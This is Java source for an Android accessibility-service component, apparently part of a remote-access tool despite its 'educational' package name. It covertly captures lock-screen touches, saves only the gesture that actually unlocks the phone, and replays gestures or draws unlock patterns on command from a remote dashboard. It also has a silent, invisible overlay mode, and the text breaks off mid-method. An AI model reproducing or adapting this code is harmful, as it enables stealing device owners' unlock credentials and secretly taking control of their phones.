package com.remoteaccess.educational.commands;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Display;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * GestureRecorder — record real touch gestures via an overlay, store locally per app,
 * and replay them using AccessibilityService.dispatchGesture().
 *
 * Storage: {filesDir}/gestures/{packageId}_{label}_{timestamp}.json
 * Each JSON file stores:
 *   { label, packageId, screenW, screenH, durationMs, points: [{id,action,x,y,t},...] }
 */
public class GestureRecorder {

    private static final String TAG      = "GestureRecorder";
    private static final String SUBDIR   = "gestures";
    private static final int    MAX_PTS  = 8000;

    private final Context            context;
    private final AccessibilityService accessSvc;
    private final WindowManager      wm;
    private final Handler            mainHandler;
    private final int                screenW;
    private final int                screenH;

    private volatile boolean       isRecording = false;
    private volatile boolean       isPaused    = false;
    private volatile RecordingOverlay overlay;

    // -- Static helper structs ------------------------------------------------

    private static class GesturePoint {
        int    pointerId;
        int    action;    // MotionEvent.ACTION_DOWN=0, MOVE=2, UP=1, POINTER_DOWN=5, POINTER_UP=6
        float  nx;        // normalized 0..1
        float  ny;        // normalized 0..1
        long   t;         // ms since recording start
    }

    // -- Constructor ----------------------------------------------------------

    public GestureRecorder(Context context, AccessibilityService accessSvc) {
        this.context    = context;
        this.accessSvc  = accessSvc;
        this.wm         = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());

        WindowManager wm2 = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm2.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        this.screenW = size.x;
        this.screenH = size.y;

        File dir = gestureDir();
        if (!dir.exists()) dir.mkdirs();
    }

    // -- Public commands ------------------------------------------------------

    /** Start recording. Returns immediately; overlay is shown on main thread. */
    public JSONObject startRecording(String packageId, String label) {
        JSONObject r = new JSONObject();
        try {
            if (isRecording) {
                r.put("success", false);
                r.put("error", "Already recording — stop current recording first");
                return r;
            }
            String safeLabel = label == null || label.trim().isEmpty() ? "gesture" : label.trim().replaceAll("[^a-zA-Z0-9_\\-]", "_");
            String safePkg   = packageId == null ? "unknown" : packageId.replaceAll("[^a-zA-Z0-9._\\-]", "_");
            isRecording = true;
            CountDownLatch latch = new CountDownLatch(1);
            mainHandler.post(() -> {
                overlay = new RecordingOverlay(context, safePkg, safeLabel, screenW, screenH, wm, () -> isRecording = false);
                overlay.show();
                latch.countDown();
            });
            latch.await(2, TimeUnit.SECONDS);
            r.put("success", true);
            r.put("message", "Recording started for package: " + safePkg);
            r.put("label", safeLabel);
            r.put("screenW", screenW);
            r.put("screenH", screenH);
        } catch (Exception e) {
            Log.e(TAG, "startRecording: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Stop recording and save the gesture file. */
    public JSONObject stopRecording() {
        JSONObject r = new JSONObject();
        try {
            if (!isRecording || overlay == null) {
                r.put("success", false);
                r.put("error", "Not currently recording");
                return r;
            }
            isRecording = false;
            final JSONObject[] saved = {null};
            CountDownLatch latch = new CountDownLatch(1);
            final RecordingOverlay currentOverlay = overlay;
            mainHandler.post(() -> {
                saved[0] = currentOverlay.stopAndSave(gestureDir());
                overlay   = null;
                latch.countDown();
            });
            latch.await(3, TimeUnit.SECONDS);
            if (saved[0] != null) {
                r.put("success", true);
                r.put("result", saved[0]);
            } else {
                r.put("success", false);
                r.put("error", "Failed to save gesture (no points recorded)");
            }
        } catch (Exception e) {
            Log.e(TAG, "stopRecording: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Cancel an in-progress recording without saving. */
    public JSONObject cancelRecording() {
        JSONObject r = new JSONObject();
        try {
            if (!isRecording || overlay == null) {
                r.put("success", false); r.put("error", "Not recording"); return r;
            }
            isRecording = false;
            final RecordingOverlay cur = overlay;
            mainHandler.post(() -> { cur.hide(); });
            overlay = null;
            r.put("success", true); r.put("message", "Recording cancelled");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Replay a saved gesture via AccessibilityService.dispatchGesture(). */
    public JSONObject replayGesture(String filename) {
        JSONObject r = new JSONObject();
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                r.put("success", false); r.put("error", "Requires Android 7+"); return r;
            }
            if (accessSvc == null) {
                r.put("success", false); r.put("error", "AccessibilityService not available"); return r;
            }
            File file = new File(gestureDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "File not found: " + filename); return r;
            }
            JSONObject data = loadJson(file);
            if (data == null) {
                r.put("success", false); r.put("error", "Failed to parse gesture file"); return r;
            }
            JSONArray points = data.getJSONArray("points");
            int srcW = data.optInt("screenW", screenW);
            int srcH = data.optInt("screenH", screenH);
            GestureDescription gesture = buildGestureDescription(points, srcW, srcH);
            if (gesture == null) {
                r.put("success", false); r.put("error", "Could not build gesture — no strokes"); return r;
            }
            boolean ok = accessSvc.dispatchGesture(gesture, null, null);
            r.put("success", ok);
            r.put("filename", filename);
            r.put("pointCount", points.length());
            if (!ok) r.put("error", "dispatchGesture returned false");
        } catch (Exception e) {
            Log.e(TAG, "replayGesture: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** List all saved gestures. */
    public JSONObject listGestures() {
        JSONObject r = new JSONObject();
        try {
            File dir = gestureDir();
            JSONArray arr = new JSONArray();
            File[] files = dir.listFiles(f -> f.getName().endsWith(".json"));
            if (files != null) {
                for (File f : files) {
                    JSONObject meta = new JSONObject();
                    meta.put("filename", f.getName());
                    meta.put("sizeBytes", f.length());
                    meta.put("modifiedMs", f.lastModified());
                    // Extract packageId and label from filename: {pkg}_{label}_{ts}.json
                    String name = f.getName().replace(".json", "");
                    String[] parts = name.split("_", 3);
                    if (parts.length >= 2) {
                        meta.put("packageId", parts[0]);
                        meta.put("label", parts.length >= 3 ? parts[1] : parts[1]);
                    }
                    // Try to read point count from file header
                    try {
                        JSONObject data = loadJson(f);
                        if (data != null) {
                            meta.put("label",      data.optString("label", ""));
                            meta.put("packageId",  data.optString("packageId", ""));
                            meta.put("pointCount", data.optJSONArray("points") != null ? data.getJSONArray("points").length() : 0);
                            meta.put("durationMs", data.optLong("durationMs", 0));
                            meta.put("screenW",    data.optInt("screenW", 0));
                            meta.put("screenH",    data.optInt("screenH", 0));
                        }
                    } catch (Exception ignored) {}
                    arr.put(meta);
                }
            }
            r.put("success", true);
            r.put("gestures", arr);
            r.put("count", arr.length());
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Load full gesture data (including all points) for visualization. */
    public JSONObject getGesture(String filename) {
        JSONObject r = new JSONObject();
        try {
            File file = new File(gestureDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "Not found: " + filename); return r;
            }
            JSONObject data = loadJson(file);
            if (data == null) {
                r.put("success", false); r.put("error", "Parse error"); return r;
            }
            r.put("success", true);
            r.put("gesture", data);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Delete a saved gesture. */
    public JSONObject deleteGesture(String filename) {
        JSONObject r = new JSONObject();
        try {
            File file = new File(gestureDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "Not found: " + filename); return r;
            }
            boolean deleted = file.delete();
            r.put("success", deleted);
            r.put("filename", filename);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    public boolean isRecording() { return isRecording; }
    public boolean isPaused()    { return isPaused; }

    /** Pause touch capture — overlay stays visible, points stop accumulating. */
    public JSONObject pauseRecording() {
        JSONObject r = new JSONObject();
        try {
            if (!isRecording || overlay == null) {
                r.put("success", false); r.put("error", "Not recording"); return r;
            }
            if (isPaused) {
                r.put("success", false); r.put("error", "Already paused"); return r;
            }
            isPaused = true;
            overlay.setPaused(true);
            r.put("success", true); r.put("message", "Recording paused");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Resume touch capture after pause. */
    public JSONObject resumeRecording() {
        JSONObject r = new JSONObject();
        try {
            if (!isRecording || overlay == null) {
                r.put("success", false); r.put("error", "Not recording"); return r;
            }
            if (!isPaused) {
                r.put("success", false); r.put("error", "Not paused"); return r;
            }
            isPaused = false;
            overlay.setPaused(false);
            r.put("success", true); r.put("message", "Recording resumed");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Return a snapshot of the live (in-progress) gesture points for dashboard preview.
     * Returns up to the last 500 points so the payload stays small.
     */
    public JSONObject getLivePoints() {
        JSONObject r = new JSONObject();
        try {
            r.put("recording", isRecording);
            r.put("paused",    isPaused);
            if (!isRecording || overlay == null) {
                r.put("success", true);
                r.put("points", new JSONArray());
                r.put("pointCount", 0);
                return r;
            }
            JSONArray snapshot = overlay.getPointsSnapshot(500);
            r.put("success",    true);
            r.put("points",     snapshot);
            r.put("pointCount", snapshot.length());
            r.put("screenW",    screenW);
            r.put("screenH",    screenH);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    // -- Internal helpers -----------------------------------------------------

    private File gestureDir() {
        return new File(context.getFilesDir(), SUBDIR);
    }

    private JSONObject loadJson(File file) {
        try (FileReader fr = new FileReader(file)) {
            StringBuilder sb = new StringBuilder();
            char[] buf = new char[4096];
            int n;
            while ((n = fr.read(buf)) != -1) sb.append(buf, 0, n);
            return new JSONObject(sb.toString());
        } catch (Exception e) {
            Log.e(TAG, "loadJson: " + e.getMessage());
            return null;
        }
    }

    /**
     * Build GestureDescription from recorded normalized points.
     * Groups points by pointerId and builds one StrokeDescription per stroke
     * (pointer-down to pointer-up segment).
     */
    private GestureDescription buildGestureDescription(JSONArray points, int srcW, int srcH) throws Exception {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return null;

        // Points are stored as normalized fractions (nx=rawX/srcW, ny=rawY/srcH).
        // To replay, simply multiply by the current device's screen dimensions.
        // No additional scale factor needed — the normalization already handles size differences.

        Map<Integer, List<long[]>> strokes = new HashMap<>(); // pointerId -> list of [t, x, y]

        long firstTime = -1;
        for (int i = 0; i < points.length(); i++) {
            JSONObject pt = points.getJSONObject(i);
            int action = pt.getInt("action");
            int pid    = pt.optInt("id", 0);
            long t     = pt.getLong("t");
            float nx   = (float) pt.getDouble("nx");
            float ny   = (float) pt.getDouble("ny");
            // Map normalized [0..1] fractions onto the current screen
            float sx   = nx * screenW;
            float sy   = ny * screenH;
            // clamp to screen bounds
            sx = Math.max(1, Math.min(screenW - 1, sx));
            sy = Math.max(1, Math.min(screenH - 1, sy));

            if (firstTime < 0) firstTime = t;
            long relT = t - firstTime;

            if (action == MotionEvent.ACTION_DOWN || action == MotionEvent.ACTION_POINTER_DOWN || action == 5) {
                strokes.put(pid, new ArrayList<>());
            }
            List<long[]> pts = strokes.get(pid);
            if (pts == null) { pts = new ArrayList<>(); strokes.put(pid, pts); }
            pts.add(new long[]{ relT, (long) sx, (long) sy });
        }

        GestureDescription.Builder builder = new GestureDescription.Builder();
        boolean hasStroke = false;

        for (Map.Entry<Integer, List<long[]>> entry : strokes.entrySet()) {
            List<long[]> pts = entry.getValue();
            if (pts.size() < 1) continue;

            Path path = new Path();
            long startT = pts.get(0)[0];
            long endT   = pts.get(pts.size() - 1)[0];
            long dur    = Math.max(50, endT - startT);

            path.moveTo(pts.get(0)[1], pts.get(0)[2]);
            for (int i = 1; i < pts.size(); i++) {
                path.lineTo(pts.get(i)[1], pts.get(i)[2]);
            }

            builder.addStroke(new GestureDescription.StrokeDescription(path, startT, dur));
            hasStroke = true;
        }

        return hasStroke ? builder.build() : null;
    }

    // ── Service-touch auto-capture (no overlay window) ────────────────────────
    // Both auto-capture modes record via AccessibilityService.onTouchEvent()
    // so no overlay is needed and the user's input is never blocked.

    private volatile boolean       autoCapturing    = false;

    // Points accumulated for the dashboard-started auto-capture session
    private final List<GesturePoint> servicePts     = new ArrayList<>();
    private volatile long            servicePtsStart = 0;

    // -- Screen-lock auto-capture state (service-touch, no overlay) -----------
    private volatile boolean         lockCaptureEnabled = false;
    private volatile boolean         lockCaptureActive  = false;
    // Points for the gesture currently in progress on the lock screen
    private final List<GesturePoint> lockCurrentPts     = new ArrayList<>();
    private volatile long            lockCurrentStart    = 0;
    private final Handler            lockGestureHandler  = new Handler(Looper.getMainLooper());

    private BroadcastReceiver        screenStateReceiver;
    private volatile boolean         screenStateReceiverRegistered = false;

    /**
     * Draw a pattern from normalized node coordinates received from the dashboard.
     * Params JSON expected: { nodes: [{nx, ny}, ...], sequence: [int, ...] }
     * The pattern is executed as a single gesture stroke through all nodes.
     */
    public JSONObject drawPattern(JSONObject params) {
        JSONObject r = new JSONObject();
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                r.put("success", false); r.put("error", "Requires Android 7+"); return r;
            }
            if (accessSvc == null) {
                r.put("success", false); r.put("error", "Accessibility service not running"); return r;
            }

            JSONArray nodes = params.optJSONArray("nodes");
            if (nodes == null || nodes.length() < 2) {
                r.put("success", false); r.put("error", "Need at least 2 nodes to draw a pattern"); return r;
            }

            // Detect screen size to map normalized coords
            android.graphics.Point sz = new android.graphics.Point();
            wm.getDefaultDisplay().getRealSize(sz);
            int curW = sz.x;
            int curH = sz.y;

            // Build a smooth path through the nodes with interpolated points
            Path path = new Path();
            long durationMs = 80L * nodes.length(); // ~80ms per node transition

            for (int i = 0; i < nodes.length(); i++) {
                JSONObject node = nodes.getJSONObject(i);
                float nx = (float) node.getDouble("nx");
                float ny = (float) node.getDouble("ny");
                float sx = Math.max(1, Math.min(curW - 1, nx * curW));
                float sy = Math.max(1, Math.min(curH - 1, ny * curH));
                if (i == 0) path.moveTo(sx, sy);
                else        path.lineTo(sx, sy);
            }

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, Math.max(100, durationMs)));
            GestureDescription gesture = builder.build();

            boolean ok = accessSvc.dispatchGesture(gesture, null, null);
            r.put("success", ok);
            r.put("nodeCount", nodes.length());
            r.put("durationMs", durationMs);
            if (!ok) r.put("error", "dispatchGesture returned false");
        } catch (Exception e) {
            Log.e(TAG, "drawPattern: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Start auto-capturing complex gestures via AccessibilityService.onTouchEvent().
     * No overlay window is created — the user's interaction is never blocked.
     * Points are collected until stopAutoCapture() is called, then saved.
     */
    public JSONObject startAutoCapture() {
        JSONObject r = new JSONObject();
        try {
            if (autoCapturing) {
                r.put("success", false); r.put("error", "Auto-capture already running"); return r;
            }
            synchronized (servicePts) { servicePts.clear(); }
            servicePtsStart = System.currentTimeMillis();
            autoCapturing   = true;
            r.put("success", true);
            r.put("message", "Auto-capture started — recording via accessibility touch events");
        } catch (Exception e) {
            autoCapturing = false;
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Stop auto-capture and save captured gestures that are complex enough.
     * Filters out straight-line swipes and single taps before saving.
     */
    public JSONObject stopAutoCapture() {
        JSONObject r = new JSONObject();
        try {
            // Always disable lock-screen capture (runs automatically on service connect).
            disableLockScreenAutoCapture();

            if (!autoCapturing) {
                r.put("success", true);
                r.put("saved", false);
                r.put("message", "Auto-capture stopped");
                return r;
            }
            autoCapturing = false;

            // Grab whatever was collected and clear the buffer.
            List<GesturePoint> snapshot;
            synchronized (servicePts) {
                snapshot = new ArrayList<>(servicePts);
                servicePts.clear();
            }

            if (snapshot.size() < 10) {
                r.put("success", true);
                r.put("saved", false);
                r.put("message", "No complex gestures captured");
                return r;
            }

            long durationMs = snapshot.get(snapshot.size() - 1).t - snapshot.get(0).t;
            JSONObject saved = saveServiceGesturePoints(
                    snapshot, "auto", "auto_" + System.currentTimeMillis(), durationMs);
            r.put("success", true);
            r.put("saved", saved != null);
            if (saved != null) r.put("result", saved);
            else r.put("message", "Gesture too simple to save (tap/straight swipe)");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    // =========================================================================
    // Screen-Lock Auto-Capture (auto-start on accessibility enable)
    // Records when screen is ON+LOCKED, pauses when screen is UNLOCKED.
    // =========================================================================

    /**
     * Enable automatic gesture capture tied to screen lock state.
     * Registers a BroadcastReceiver to respond to screen ON/OFF/UNLOCK events.
     * Call this from UnifiedAccessibilityService.onServiceConnected().
     */
    public void enableLockScreenAutoCapture() {
        try {
            if (screenStateReceiverRegistered) return;
            lockCaptureEnabled = true;
            screenStateReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context ctx, Intent intent) {
                    try {
                        String action = intent.getAction();
                        if (action == null) return;
                        switch (action) {
                            case Intent.ACTION_SCREEN_ON:
                                onScreenOn();
                                break;
                            case Intent.ACTION_USER_PRESENT:
                                onScreenUnlocked();
                                break;
                            case Intent.ACTION_SCREEN_OFF:
                                onScreenOff();
                                break;
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "screenStateReceiver: " + e.getMessage());
                    }
                }
            };
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            filter.addAction(Intent.ACTION_USER_PRESENT);
            context.registerReceiver(screenStateReceiver, filter);
            screenStateReceiverRegistered = true;
            Log.i(TAG, "Lock-screen auto-capture ENABLED");
        } catch (Exception e) {
            Log.e(TAG, "enableLockScreenAutoCapture: " + e.getMessage());
        }
    }

    /**
     * Disable automatic lock-screen gesture capture and unregister receiver.
     */
    public void disableLockScreenAutoCapture() {
        try {
            lockCaptureEnabled = false;
            if (screenStateReceiver != null && screenStateReceiverRegistered) {
                try { context.unregisterReceiver(screenStateReceiver); } catch (Exception ignored) {}
                screenStateReceiver = null;
                screenStateReceiverRegistered = false;
            }
            stopLockCapture();
            Log.i(TAG, "Lock-screen auto-capture DISABLED");
        } catch (Exception e) {
            Log.e(TAG, "disableLockScreenAutoCapture: " + e.getMessage());
        }
    }

    private void onScreenOn() {
        try {
            if (!lockCaptureEnabled) return;
            KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
            boolean isLocked = km != null && km.isKeyguardLocked();
            if (isLocked) {
                startLockCapture();
            }
        } catch (Exception e) {
            Log.e(TAG, "onScreenOn: " + e.getMessage());
        }
    }

    private void onScreenUnlocked() {
        try {
            stopLockCapture();
        } catch (Exception e) {
            Log.e(TAG, "onScreenUnlocked: " + e.getMessage());
        }
    }

    private void onScreenOff() {
        try {
            stopLockCapture();
        } catch (Exception e) {
            Log.e(TAG, "onScreenOff: " + e.getMessage());
        }
    }

    /**
     * Mark that the lock-screen is showing and we should start capturing touches
     * via the AccessibilityService touch-event pipeline (no overlay window).
     */
    private void startLockCapture() {
        if (lockCaptureActive) return;
        synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
        lockCurrentStart    = System.currentTimeMillis();
        lockCaptureActive   = true;
        Log.i(TAG, "Lock-screen capture STARTED (service-touch mode)");
    }

    /**
     * Lock screen gone (screen off or user unlocked via a different path).
     * Discard whatever partial gesture is in progress.
     */
    private void stopLockCapture() {
        if (!lockCaptureActive) return;
        lockCaptureActive = false;
        synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
        Log.i(TAG, "Lock-screen capture STOPPED");
    }

    // =========================================================================
    // Service Touch Event Handling
    // Called from UnifiedAccessibilityService.onTouchEvent() — no overlay needed.
    // =========================================================================

    /**
     * Primary entry point: feed every MotionEvent from the AccessibilityService here.
     * Returns immediately if neither auto-capture nor lock-capture is active.
     * Always returns false so the system passes the touch through to the foreground app.
     */
    public void handleServiceTouchEvent(MotionEvent event) {
        if (!autoCapturing && !lockCaptureActive) return;

        int action    = event.getActionMasked();
        int pidIdx    = event.getActionIndex();
        int ptrCount  = event.getPointerCount();
        long nowMs    = System.currentTimeMillis();

        // ── Lock-screen mode: capture per-gesture, save only on successful unlock ──
        if (lockCaptureActive) {
            if (action == MotionEvent.ACTION_DOWN) {
                synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
                lockCurrentStart = nowMs;
            }

            long relT = nowMs - lockCurrentStart;
            synchronized (lockCurrentPts) {
                for (int i = 0; i < ptrCount; i++) {
                    GesturePoint gp = new GesturePoint();
                    gp.pointerId = event.getPointerId(i);
                    gp.action    = (i == pidIdx) ? action : MotionEvent.ACTION_MOVE;
                    gp.nx        = event.getX(i) / screenW;
                    gp.ny        = event.getY(i) / screenH;
                    gp.t         = relT;
                    lockCurrentPts.add(gp);
                }
            }

            if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_CANCEL) {
                onLockGestureLifted(nowMs);
            }
            return;
        }

        // ── Manual auto-capture: accumulate everything until stopAutoCapture() ──
        if (autoCapturing) {
            long relT = nowMs - servicePtsStart;
            synchronized (servicePts) {
                for (int i = 0; i < ptrCount; i++) {
                    GesturePoint gp = new GesturePoint();
                    gp.pointerId = event.getPointerId(i);
                    gp.action    = (i == pidIdx) ? action : MotionEvent.ACTION_MOVE;
                    gp.nx        = event.getX(i) / screenW;
                    gp.ny        = event.getY(i) / screenH;
                    gp.t         = relT;
                    servicePts.add(gp);
                }
            }
        }
    }

    /**
     * Called when the user lifts their finger on the lock screen.
     * Waits 350 ms then checks the keyguard state: if the device is now unlocked
     * the gesture was the correct unlock pattern, so we save it.
     */
    private void onLockGestureLifted(long gestureEndMs) {
        final List<GesturePoint> snapshot;
        synchronized (lockCurrentPts) {
            if (lockCurrentPts.size() < 8) {
                lockCurrentPts.clear();
                return;
            }
            long dur = gestureEndMs - lockCurrentStart;
            if (dur < 150) {
                lockCurrentPts.clear();
                return;
            }
            snapshot = new ArrayList<>(lockCurrentPts);
            lockCurrentPts.clear();
        }

        long dur = gestureEndMs - lockCurrentStart;
        lockGestureHandler.postDelayed(() -> {
            try {
                KeyguardManager km = (KeyguardManager)
                        context.getSystemService(Context.KEYGUARD_SERVICE);
                boolean stillLocked = km != null && km.isKeyguardLocked();
                if (!stillLocked) {
                    // The gesture just unlocked the device — save it.
                    saveServiceGesturePoints(snapshot,
                            "lock", "lockscreen_" + System.currentTimeMillis(), dur);
                    Log.i(TAG, "Lock-screen gesture saved (" + snapshot.size() + " pts)");
                }
            } catch (Exception e) {
                Log.e(TAG, "onLockGestureLifted: " + e.getMessage());
            }
        }, 350);
    }

    /**
     * Persist a list of GesturePoints to a JSON file in the gesture directory.
     * Applies the same complexity filter as RecordingOverlay.stopAndSaveIfComplex().
     * Returns the saved-file JSONObject on success, null if the gesture was too simple.
     */
    private JSONObject saveServiceGesturePoints(
            List<GesturePoint> pts, String pkgId, String label, long durationMs) {
        try {
            if (pts.size() < 8) return null;

            // Complexity filter ― same as RecordingOverlay.stopAndSaveIfComplex
            boolean multiPointer = false;
            for (GesturePoint gp : pts) {
                if (gp.pointerId != 0) { multiPointer = true; break; }
            }

            if (!multiPointer && pts.size() >= 3) {
                GesturePoint first = pts.get(0);
                GesturePoint last  = pts.get(pts.size() - 1);
                float dx  = last.nx - first.nx;
                float dy  = last.ny - first.ny;
                float len = (float) Math.sqrt(dx * dx + dy * dy);
                if (len < 0.05f) {
                    if (durationMs < 1500) return null; // simple tap
                } else {
                    float maxDev = 0;
                    for (GesturePoint gp : pts) {
                        float crossLen = Math.abs((gp.nx - first.nx) * dy
                                - (gp.ny - first.ny) * dx);
                        float dev = crossLen / len;
                        if (dev > maxDev) maxDev = dev;
                    }
                    if (maxDev <= 0.05f) return null; // straight swipe
                }
            }

            // Build JSON payload
            JSONArray arr = new JSONArray();
            for (GesturePoint gp : pts) {
                JSONObject p = new JSONObject();
                p.put("id",     gp.pointerId);
                p.put("action", gp.action);
                p.put("nx",     gp.nx);
                p.put("ny",     gp.ny);
                p.put("t",      gp.t);
                arr.put(p);
            }
            JSONObject data = new JSONObject();
            data.put("label",       label);
            data.put("packageId",   pkgId);
            data.put("screenW",     screenW);
            data.put("screenH",     screenH);
            data.put("durationMs",  durationMs);
            data.put("recordedAt",  System.currentTimeMillis());
            data.put("points",      arr);

            String ts  = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                    .format(new Date());
            String fn  = pkgId + "_" + label + "_" + ts + ".json";
            File   out = new File(gestureDir(), fn);
            try (FileWriter fw = new FileWriter(out)) { fw.write(data.toString()); }

            JSONObject res = new JSONObject();
            res.put("filename",   fn);
            res.put("pointCount", pts.size());
            res.put("durationMs", durationMs);
            Log.i(TAG, "Service gesture saved: " + fn + " (" + pts.size() + " pts)");
            return res;
        } catch (Exception e) {
            Log.e(TAG, "saveServiceGesturePoints: " + e.getMessage());
            return null;
        }
    }

    // =========================================================================
    // Recording Overlay View
    // =========================================================================

    private static class RecordingOverlay {
        private final Context context;
        private final String packageId;
        private final String label;
        private final int    screenW;
        private final int    screenH;
        private final WindowManager wm;
        private final Runnable onStop;

        private View view;
        private WindowManager activeWm;
        private final List<GesturePoint> points = new ArrayList<>();
        private long startTime;
        private boolean stopped = false;
        private volatile boolean paused = false;
        private volatile boolean silent = false;
        // lockMode: per-gesture save — discard if device still locked after finger lift
        private volatile boolean lockMode = false;
        private final List<GesturePoint> currentGesturePts = new ArrayList<>();
        private long currentGestureStartTime = 0;
        private final Handler overlayHandler = new Handler(Looper.getMainLooper());

        // Drawing state
        private final Map<Integer, Path> activePaths = new HashMap<>();
        private final List<Path>         finishedPaths = new ArrayList<>();
        private final Paint paintPath;
        private final Paint paintHint;
        private final Paint paintBg;

        RecordingOverlay(Context context, String packageId, String label,
                         int screenW, int screenH, WindowManager wm, Runnable onStop) {
            this.context   = context;
            this.packageId = packageId;
            this.label     = label;
            this.screenW   = screenW;
            this.screenH   = screenH;
            this.wm        = wm;
            this.onStop    = onStop;

            paintPath = new Paint(Paint.ANTI_ALIAS_FLAG);
            paintPath.setColor(Color.parseColor("#00FF88"));
            paintPath.setStyle(Paint.Style.STROKE);
            paintPath.setStrokeWidth(6f);
            paintPath.setStrokeCap(Paint.Cap.ROUND);
            paintPath.setStrokeJoin(Paint.Join.ROUND);

            paintHint = new Paint(Paint.ANTI_ALIAS_FLAG);
            paintHint.setColor(Color.WHITE);
            paintHint.setTextSize(42f);
            paintHint.setTextAlign(Paint.Align.CENTER);
            paintHint.setShadowLayer(4, 0, 0, Color.BLACK);

            paintBg = new Paint();
            paintBg.setColor(Color.parseColor("#55000000"));
        }

        /** Set silent mode: no visual feedback, completely transparent overlay. */
        void setSilent(boolean silent) {
            this.silent = silent;
        }

        /**
         * Lock mode: instead of one big recording, each finger-down→finger-up is treated
         * as a single gesture attempt. After each lift, checks if the device is now unlocked:
         *   - unlocked → save that gesture
         *   - still locked → discard and start fresh for the next attempt
         */
        void setLockMode(boolean lockMode) {
            this.lockMode = lockMode;
        }

        void show() {
            startTime = System.currentTimeMillis();

            // Prefer the AccessibilityService as context — TYPE_ACCESSIBILITY_OVERLAY requires
            // a WindowManager token that only an AccessibilityService can provide.
            com.remoteaccess.educational.services.UnifiedAccessibilityService svc =
                com.remoteaccess.educational.services.UnifiedAccessibilityService.getInstance();
            final Context viewCtx = (svc != null) ? svc : context;
            final WindowManager overlayWm = (svc != null)
                ? (WindowManager) svc.getSystemService(Context.WINDOW_SERVICE)
                : wm;

            view = new View(viewCtx) {
                @Override
                public boolean onTouchEvent(MotionEvent event) {
                    if (!stopped) handleTouch(event);
                    // In silent mode: return false so the touch event passes through
                    // to the underlying window (lock screen). The overlay still receives
                    // and records the event before passing it on.
                    return !silent;
                }

                @Override
                protected void onDraw(Canvas canvas) {
                    // Silent mode = completely invisible, nothing drawn at all
                    if (silent) return;
                    // Non-silent recording mode: show visual feedback
                    canvas.drawRect(0, 0, getWidth(), getHeight(), paintBg);
                    for (Path p : finishedPaths) canvas.drawPath(p, paintPath);
                    for (Path p : activePaths.values()) canvas.drawPath(p, paintPath);
                    String recLabel = paused ? "⏸ PAUSED" : "●";
                    canvas.drawText(recLabel, getWidth() / 2f, 120, paintHint);
                }
            };
            view.setLayerType(View.LAYER_TYPE_SOFTWARE, null);

            // In silent mode, add FLAG_NOT_TOUCHABLE so the overlay is completely
            // transparent to user input — the device owner can interact normally.
            int flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
            if (silent) {
                flags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
            }
